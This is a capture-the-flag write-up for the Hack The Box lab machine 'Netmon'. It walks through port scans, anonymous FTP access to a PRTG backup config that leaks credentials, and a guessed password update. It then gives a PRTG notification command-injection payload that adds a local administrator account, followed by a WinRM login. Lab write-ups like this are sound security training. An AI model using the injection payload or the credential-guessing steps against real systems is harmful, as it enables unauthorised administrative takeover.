# HTB - Netmon

#### Ip: 10.10.10.152
#### Name: Netmon
#### Rating: Easy

----------------------------------------------------------------------

Netmon.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/HTB/Netmon]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 13:15 CDT
Warning: 10.10.10.152 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.152
Host is up (0.071s latency).
Not shown: 65491 closed tcp ports (reset), 31 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.96 seconds
```

Lets also use the `-sC` and `-sV` flags to use Nmap basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/Netmon]
└─$ sudo nmap -sC -sV -T4 10.10.10.152 -p 21,80,135,139,445,5985,47001
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 13:16 CDT
Nmap scan report for 10.10.10.152
Host is up (0.066s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-09T18:17:06
|_  start_date: 2023-08-09T18:14:16
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
```

Cool, looks like FTP has anonymous access enabled and it contains what appears to be the `C:\` drive? Always a winning combo.

Lets check that out first:

```text
┌──(ryan㉿kali)-[~/HTB/Netmon]
└─$ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:ryan): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49866|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49867|)
150 Opening ASCII mode data connection.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49868|)
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
08-09-23  02:14PM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||49871|)
150 Opening ASCII mode data connection.
100% |********************************************************************************|    34        0.48 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.48 KiB/s)
```

Wow, we were able to grab the user.txt flag:

user_flag.png

Browsing around a bit more we find some interesting configuration files for the PRTG Network Monitor. Lets use the `get` command to bring these back locally for inspection.

Checking out the PRTG Configuration.old.bak file, we find some credentials:

creds.png

Navigating to the website on port 80 we find a login for PRTG Network Monitor. Lets try the credentials here:

fail.png

Hmm, these aren't working here. I did notice that the password has the year 2018 in it. Maybe the password we found was old and the admin got lazy and just changed the password up a year? Lets try PrTg@dmin2019

Nice, that worked!

in.png

This version of PRTG is vulnerable to command injection. We can exploit this by heading over to the Notifications section in Account Settings and selecting "Add New Notification."

From there we can scroll down to the Execute Program feature and enable it. We can select the .ps1 script and then add in the Parameter field:

```text
test.txt;net user howdy Password123! /add;net localgroup administrators howdy /add
```

I can now hit Save and make sure my new notification is active:

active.png

Once this is done we can click on the bell icon to test the notification (ie add our user).

Once completed lets use CrackMapExec to make sure our user has been added:

cme.png

Cool, we can now log on to the box to grab the last flag:

```text
┌──(ryan㉿kali)-[~/HTB/Netmon]
└─$ evil-winrm -i 10.10.10.152 -u howdy -p Password123!
```

root_flag.png

Thanks for following along!

-Ryan

----------------------------------------------------------------------------


